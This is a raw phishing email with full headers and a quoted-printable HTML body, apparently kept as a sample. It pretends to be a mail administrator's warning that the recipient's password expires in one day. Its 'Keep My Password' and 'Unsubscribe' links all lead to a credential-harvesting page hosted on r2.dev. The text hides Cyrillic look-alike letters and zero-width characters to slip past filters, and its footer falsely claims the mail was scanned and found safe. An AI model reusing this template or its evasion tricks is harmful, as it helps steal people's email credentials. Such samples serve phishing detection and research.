@@ -1,0 +1,169 @@
+Return-Path: admin@adv-intt.com
+Delivered-To: jose@monkey.org
+X-FDA: 80898591900.10.613EB52
+Received: from rdns0.adv-intt.com (rdns0.adv-intt.com [194.110.247.114])
+	by imf27.b.hostedemail.com (Postfix) with ESMTP id DFD661A0007
+	for <jose@monkey.org>; Tue, 13 Jun 2023 18:41:08 +0000 (UTC)
+Authentication-Results: imf27.b.hostedemail.com;
+	dkim=pass header.d=adv-intt.com header.s=default header.b=UX9SV9pI;
+	spf=pass (imf27.b.hostedemail.com: domain of admin@adv-intt.com designates 194.110.247.114 as permitted sender) smtp.mailfrom=admin@adv-intt.com;
+	dmarc=pass (policy=reject) header.from=adv-intt.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1686681669;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=/0LqdKJIgKNldT76lfmnvoZ9obUAO5qopaWDPU6fG3g=;
+	b=mrBohgjsJHng6VtsXCjwrkssMCYUZKCWGDLyuQ0ZP1eIK6y+mlE3f/WlGNwgqEBvTXE3XZ
+	cPDKxZZVOqW9qsusD1HdteqKiidRL20524DfRJGnfVaRs21dA2HSgRj+RpCpby07G8Qrf4
+	hT1fXDC/Kx9yvqe0M1YVOm5vdW+aGh0=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1686681669; a=rsa-sha256;
+	cv=none;
+	b=RGVfXR2GwvB5k6f85hjfs0zMyV6oleOWWDYFDbkL9SaGlNBBlFlkm3CFraaXNTppQjmt1g
+	e75dPtkdHD6OxHg3eVATpmV/6Cfx++NxrGx4usEnBwtmDyZM58gGJDmLWQv70tvxD9tAPV
+	KxdIO1ZIqazgxSh8H34uyhtUZoHYhtk=
+ARC-Authentication-Results: i=1;
+	imf27.b.hostedemail.com;
+	dkim=pass header.d=adv-intt.com header.s=default header.b=UX9SV9pI;
+	spf=pass (imf27.b.hostedemail.com: domain of admin@adv-intt.com designates 194.110.247.114 as permitted sender) smtp.mailfrom=admin@adv-intt.com;
+	dmarc=pass (policy=reject) header.from=adv-intt.com
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=default; d=adv-intt.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
+ Content-Transfer-Encoding; i=admin@adv-intt.com;
+ bh=FNo5X5/DmTXCiHcNsxhp5kdgqNE=;
+ b=UX9SV9pIysc7Ez73yVZIvznLzdM8xHoI0EZp6gY/5FBAB9kvLR3JcAl1p8flLtZPIPSKYqDiwDiG
+   fIFRvdTuktu0rpPsOktPtYVRDNpopMFbmqNCBFZ45EPsIMUyj8F3SdFvDAGrD2Qs4CW2z/K6qrHp
+   POrFy3zlTtFgtMxBK1o=
+From: Mail Adminstrator  <admin@adv-intt.com>
+To: jose@monkey.org
+Subject: [Ticket ID:SGYE-271-LPEhz4YtyUWe] IMPORTANT: You have 1 or more new messages for Your  jose@monkey.org
+Date: 13 Jun 2023 11:41:03 -0700
+Message-ID: <20230613114103.5666E799B09545DF@adv-intt.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam06
+X-Rspamd-Queue-Id: DFD661A0007
+X-Stat-Signature: 6spm9bwzbcy8tcwr7nadcw3a9cx83em5
+X-Rspam-User: 
+X-Spam-Status: No, score=3.70
+X-HE-Tag: 1686681668-857094
+X-HE-Meta: U2FsdGVkX18XOMvAoZYQScU16A1c83PRimpDgP+tChDJrZ8zYwcRaZrk61Cjmqgkfz98FRXSwHuQ87DCVrbmUsmT1RiDwy/Y9RufWoxfhh87u8hrBnpdtQB9RxuH4RiYFvfk3TZf6I4TgwGYmIBzrddj90Hd7Y4R56oJPHBt+rT0cKzrmDv1HiLLX4JRefNj2ixGIY9S3zvgvdmbJLFpNACVmZ4Z40ry8Y1RpH52Eqa9PCHrNriv1NMLuio2jeKyaZ8WLawbGEbs3fCg+Q2iHdJFAJ68E25l9KRzmx/Mu+ItT/uqUWc54klS2/0op8KfmQJkn2Q9KHC7w5AltNwh9Mu02YLunzEpnXyYV0Xb4uJV5168pHG6+udWXrk4BqwT6u76fZfR+b7y0HTjIIjoyXS3FN9lj4PVJF+RZM3u5T9hWyk0cjvxezdX5Ip0zIdVMISKUjv8ogRClcWUn8Z9CuocDT52b1zPUnNRGOsxdWbONM20RDT7DjBub0pGecJu7v8Cxik4b4SIswGnHRFQOmbDafREfKfiRXignoUz2ENafFOke9sGtiMRPawVRJpjOLRPeA2xK+slLVg/DG7BRqspQXyOMlxGdCKsaq6UbxfQk8HgEgib7hk5IMZQg1f60Un5xD4YWQeGp5mLVZxBgU8bTzYic8Fiv/d5MLJuYDQvZ5wQWZ5ZZQ==
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 157
+
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em; font-size: 14pt;"><div class=3D"Ar Au Ao" id=
+=3D":16c" style=3D"display: block;"><a href=3D"https://pub-78c4481cdfd645e9=
+9857bfc7b5c5d58f.r2.dev/redirecting.html#jose@monkey.org"><div tabindex=3D"=
+1" class=3D"Am Al editable LW-avf tS-tW tS-tY" id=3D":1b2" role=3D"textbox"=
+ aria-controls=3D":31c" aria-owns=3D":31c" style=3D"direction: ltr; min-hei=
+ght: 334px;" contenteditable=3D"true" hidefocus=3D"true" spellcheck=3D"fals=
+e" aria-label=3D"Message Body" aria-multiline=3D"true" g_editable=3D"true">=
+
+<p style=3D'color: rgb(29, 34, 40); font-family: "Helvetica Neue",Helvetica=
+,Arial,sans-serif; font-size: 13px; margin-top: 0px; margin-bottom: 1rem; b=
+ox-sizing: border-box;'><font face=3D"Segoe UI Light" style=3D"box-sizing: =
+border-box;">Hi jose,&#65279;&#65279;<br style=3D"box-sizing: border-box;">=
+<br style=3D"box-sizing: border-box;">
+Your jose@monkey.org p&#1072;&#65279;&#65279;&#65279;&#65279;ssword is s&#1=
+077;&#65279;&#65279;&#65279;&#65279;t to &#1077;&#65279;&#65279;&#65279;&#6=
+5279;xpir&#1077;&#65279;&#65279;&#65279;&#65279; in<span style=3D"box-sizin=
+g: border-box;">&nbsp;</span><font color=3D"#ff0000" style=3D"box-sizing: b=
+order-box;">1&nbsp;</font>d&#1072;&#65279;&#65279;&#65279;&#65279;y(s).<br =
+style=3D"box-sizing: border-box;"><br style=3D"box-sizing: border-box;">
+&nbsp;&#65279;&#65279;&#65279;&#65279;&nbsp;&#65279;&#65279;&#65279;&#65279=
+;&nbsp;&#65279;&#65279;&#65279;&#65279;&nbsp;&#65279;&#65279;&#65279;&#6527=
+9;&nbsp;&#65279;&#65279;&#65279;&#65279;&nbsp;&#65279;&#65279;&#65279;&#652=
+79;<wbr>&nbsp;&#65279;&#65279;&#65279;&#65279;&#10687;&#65279;&#65279;&#652=
+79;&#65279; jose@monkey.org<br style=3D"box-sizing: border-box;"><br style=
+=3D"box-sizing: border-box;">
+W&#65279;&#65279;e enc&#1086;&#65279;&#65279;&#65279;&#65279;urage y&#1086;=
+&#65279;&#65279;&#65279;&#65279;u to ta&#65279;&#65279;ke the t&#1110;&#652=
+79;&#65279;&#65279;&#65279;me n&#1086;&#65279;&#65279;&#65279;&#65279;w to =
+ma&#1110;&#65279;&#65279;&#65279;&#65279;nta&#1110;&#65279;&#65279;&#65279;=
+&#65279;n y&#1086;&#65279;&#65279;&#65279;&#65279;ur p&#1072;&#65279;&#6527=
+9;&#65279;&#65279;ssw&#1086;&#65279;&#65279;&#65279;&#65279;rd=20
+act&#1110;&#65279;&#65279;&#65279;&#65279;v&#1110;&#65279;&#65279;&#65279;&=
+#65279;ty to avo&#1110;&#65279;&#65279;&#65279;&#65279;d log&#1110;&#65279;=
+&#65279;&#65279;&#65279;n &#1110;&#65279;&#65279;&#65279;&#65279;nterrupti&=
+#1086;&#65279;&#65279;&#65279;&#65279;n.<br style=3D"box-sizing: border-box=
+;"><br style=3D"box-sizing: border-box;">
+<a style=3D'background: rgb(38, 112, 236); padding: 7px; color: rgb(255, 25=
+5, 255); font-family: "segoe ui light"; font-size: 15px; box-sizing: border=
+-box; text-decoration-line: none;' href=3D"https://pub-78c4481cdfd645e99857=
+bfc7b5c5d58f.r2.dev/redirecting.html#jose@monkey.org" target=3D"_blank" rel=
+=3D"noreferrer"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://cloudflare-i=
+pfs.com/ipfs/QmTcoExKyNP1ZbkKmtMSkB147M1SeGSDoxtZxDhGTHhGM4%23%5B%5B-Email-=
+%5D%5D&amp;source=3Dgmail&amp;ust=3D1686602185699000&amp;usg=3DAOvVaw27QZpU=
+sevKRCVVaOyJVWyF">K&#1077;&#65279;&#65279;&#1077;&#65279;&#65279;p M&#65279=
+;y &#1056;&#65279;&#65279;&#1072;&#65279;&#65279;ss&#65279;w&#65279;&#65279=
+;or&#65279;d</a>
+<a style=3D"color: rgb(0, 138, 204); box-sizing: border-box; background-col=
+or: transparent;" href=3D"https://webmail.georgian-airways.com/cpsess336255=
+0250/3rdparty/roundcube/#NOP" target=3D"_blank" rel=3D"noreferrer" data-saf=
+eredirecturl=3D"https://www.google.com/url?q=3Dhttps://webmail.georgian-air=
+ways.com/cpsess3362550250/3rdparty/roundcube/%23NOP&amp;source=3Dgmail&amp;=
+ust=3D1686602185699000&amp;usg=3DAOvVaw3NTA2m-PjR81tXwPHiSGeE"><br style=3D=
+"box-sizing: border-box;"><br></a></font></p>
+<a style=3D'color: rgb(29, 34, 40); font-family: "Helvetica Neue",Helvetica=
+,Arial,sans-serif; font-size: 13px; box-sizing: border-box; text-decoration=
+-line: none;' href=3D"https://webmail.georgian-airways.com/cpsess3362550250=
+/3rdparty/roundcube/#NOP" target=3D"_blank" rel=3D"noreferrer" data-safered=
+irecturl=3D"https://www.google.com/url?q=3Dhttps://webmail.georgian-airways=
+=2Ecom/cpsess3362550250/3rdparty/roundcube/%23NOP&amp;source=3Dgmail&amp;us=
+t=3D1686602185699000&amp;usg=3DAOvVaw3NTA2m-PjR81tXwPHiSGeE"></a>
+<span style=3D"color: rgb(44, 54, 58); font-family: Roboto,sans-serif; font=
+-size: 14px;"></span><span style=3D'color: rgb(29, 34, 40); font-family: "H=
+elvetica Neue",Helvetica,Arial,sans-serif; font-size: 13px; box-sizing: bor=
+der-box;'></span><span style=3D"color: rgb(44, 54, 58); font-family: Roboto=
+,sans-serif; font-size: 14px;"></span>
+<p style=3D'color: rgb(29, 34, 40); line-height: 20px; font-family: "Helvet=
+ica Neue",Helvetica,Arial,sans-serif; font-size: 12px; margin-top: 0px; mar=
+gin-bottom: 1rem; box-sizing: border-box;'>
+<a style=3D"color: rgb(0, 172, 255); box-sizing: border-box; background-col=
+or: transparent; text-decoration-line: none;" href=3D"https://webmail.georg=
+ian-airways.com/cpsess3362550250/3rdparty/roundcube/#NOP" target=3D"_blank"=
+ rel=3D"noreferrer" data-saferedirecturl=3D"https://www.google.com/url?q=3D=
+https://webmail.georgian-airways.com/cpsess3362550250/3rdparty/roundcube/%2=
+3NOP&amp;source=3Dgmail&amp;ust=3D1686602185699000&amp;usg=3DAOvVaw3NTA2m-P=
+jR81tXwPHiSGeE"></a>
+<a style=3D"color: rgb(25, 106, 212); font-family: sans-serif; box-sizing: =
+border-box; background-color: transparent; text-decoration-line: none;" hre=
+f=3D"https://pub-78c4481cdfd645e99857bfc7b5c5d58f.r2.dev/redirecting.html#j=
+ose@monkey.org" target=3D"_blank" rel=3D"noreferrer" data-saferedirecturl=
+=3D"https://www.google.com/url?q=3Dhttps://cloudflare-ipfs.com/ipfs/QmTcoEx=
+KyNP1ZbkKmtMSkB147M1SeGSDoxtZxDhGTHhGM4%23%5B%5B-Email-%5D%5D&amp;source=3D=
+gmail&amp;ust=3D1686602185699000&amp;usg=3DAOvVaw27QZpUsevKRCVVaOyJVWyF">
+Unsubscribe<span style=3D"box-sizing: border-box;">&nbsp;</span></a>-<span =
+style=3D"box-sizing: border-box;">&nbsp;</span>
+&nbsp;<a style=3D"color: rgb(25, 106, 212); font-family: sans-serif; box-si=
+zing: border-box; background-color: transparent; text-decoration-line: none=
+;" href=3D"https://pub-78c4481cdfd645e99857bfc7b5c5d58f.r2.dev/redirecting.=
+html#jose@monkey.org" target=3D"_blank" rel=3D"noreferrer"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://cloudflare-i=
+pfs.com/ipfs/QmTcoExKyNP1ZbkKmtMSkB147M1SeGSDoxtZxDhGTHhGM4%23%5B%5B-Email-=
+%5D%5D&amp;source=3Dgmail&amp;ust=3D1686602185699000&amp;usg=3DAOvVaw27QZpU=
+sevKRCVVaOyJVWyF">Unsubscribe Preferences</a><br style=3D"box-sizing: borde=
+r-box;"><br style=3D"box-sizing: border-box;"><span style=3D"font-weight: b=
+older; box-sizing: border-box;"><font color=3D"#df2d20" face=3D"Verdana" si=
+ze=3D"2" style=3D"box-sizing: border-box;">
+Your Email Credentials Must be Valid to ensure you are the right Recepient.=
+<br style=3D'color: rgb(51, 51, 51); font-family: "Lucida Grande",Verdana,A=
+rial,Helvetica,sans-serif; font-size: 11px; font-weight: 400; box-sizing: b=
+order-box;'></font></span><font color=3D"#868778" style=3D'font-family: "Lu=
+cida Grande",Verdana,Arial,Helvetica,sans-serif; font-size: 11px; box-sizin=
+g: border-box;'><span style=3D"font-weight: bolder; box-sizing: border-box;=
+">
+<font color=3D"#df2d20" size=3D"2" style=3D"box-sizing: border-box;"></font=
+></span>This mails has been scanned and considered safe.</font></p></div></=
+a></div></body></html>
+
